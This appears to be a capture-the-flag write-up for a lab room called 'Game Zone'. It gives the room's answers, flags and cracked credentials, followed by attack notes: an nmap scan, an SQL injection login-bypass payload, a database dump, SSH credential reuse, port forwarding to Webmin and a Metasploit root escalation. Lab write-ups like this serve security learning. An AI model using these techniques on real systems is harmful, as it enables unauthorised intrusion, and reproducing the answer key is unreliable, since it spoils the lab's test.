# Game Zone
##### Question 1: What is the name of the large cartoon avatar holding a sniper on the forum?
Answer
```bash
agent 47
```

##### Question 2: When you've logged in, what page do you get redirected to?
Answer
```bash
portal.php
```

##### Question 3: he users table, what is the hashed password?
Answer
```bash
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 
```

##### Question 4: What was the username associated with the hashed password?
Answer
```bash
agent47
```

##### Question 5: What was the other table name?
Answer
```bash
post
```

##### Question 6: What is the de-hashed password?
Answer
```bash
videogamer124
```

##### Question 7: User flag
Answer
```bash
649ac17b1480ac13ef1e4fa579dac95c
```

##### Question 8: How many TCP sockets are running?
Answer
```bash
5
```

##### Question 9: What is the name of the exposed CMS?
Answer
```bash
webmin
```

##### Question 10: What is the CMS version?
Answer
```bash
1.580
```

##### Question 11: root flag
Answer
```bash
a4b945830144bdd71908d12d902adeee
```

- - - - - - - - - - - - - - - - - - -  - - - - -

Nmap Scan:
```bash

Nmap scan report for 10.10.231.126
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   36.48 ms  10.6.0.1
2   ... 3
4   103.02 ms 10.10.231.126

```

Login Form vulnerable to SQL Injection
```bash
admin' or 1=1---
```

Search on Portal.php is vulnerable to SQL Injection
![[Pasted image 20211219122834.png]]

Users Database Dumped
```bash
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47 
```
cracked password: videogamer124

SSH Creds: 
```bash
agent47:videogamer124
```

Reverse SSH tunnel:
```bash
ssh -L 10000:localhost:10000 agent47@10.10.231.126
```

webmin login was resused creds of agent47

Metasploit module for webmin version - priv esc to root
